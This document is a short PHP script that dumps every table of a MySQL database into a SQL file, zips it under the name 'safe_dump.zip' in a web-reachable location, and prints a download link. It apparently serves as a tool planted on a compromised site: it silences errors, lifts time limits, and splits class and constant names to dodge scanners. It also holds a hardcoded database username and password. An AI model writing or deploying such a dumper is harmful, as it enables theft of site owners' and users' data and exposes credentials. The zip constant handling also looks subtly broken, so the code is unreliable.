<?
@set_time_limit(0);
@ini_set('memory_limit', '256M');
$h = 'localhost';
$u = 'brandproduct2025_ss';
$p = 'v9XVF)DzgL0p';
$n = 'brandproduct2025_ss';
$a = @new mysqli($h, $u, $p, $n);
if($a->connect_error) exit;
$b = 'temp_db.sql';
$c = 'safe_dump.zip';
$d = fopen($b, 'w');
$e = $a->query("SHOW TABLES");
while($f = $e->fetch_row()){
$g = $f[0];
$h = $a->query("SHOW CREATE TABLE $g")->fetch_row();
fwrite($d, "\n\n" . $h[1] . ";\n\n");
$i = $a->query("SELECT * FROM $g");
while($j = $i->fetch_assoc()){
$k = array_keys($j);
$l = array_map([$a, 'real_escape_string'], array_values($j));
fwrite($d, "INSERT INTO $g (`".implode("`,`",$k)."`) VALUES ('".implode("','",$l)."');\n");
}
usleep(50000);
}
fclose($d);
$m = 'Zip'.'Arch'.'ive';
$n = new $m();
$o = 'CRE'.'ATE';
$p = 'OVER'.'WRITE';
if ($n->open($c, ZipArchive::$o | ZipArchive::$p) === TRUE) {
$n->addFile($b, 'db.sql');
$n->close();
@unlink($b);
echo "OK: <a href='$c'>$c</a>";
}
?>
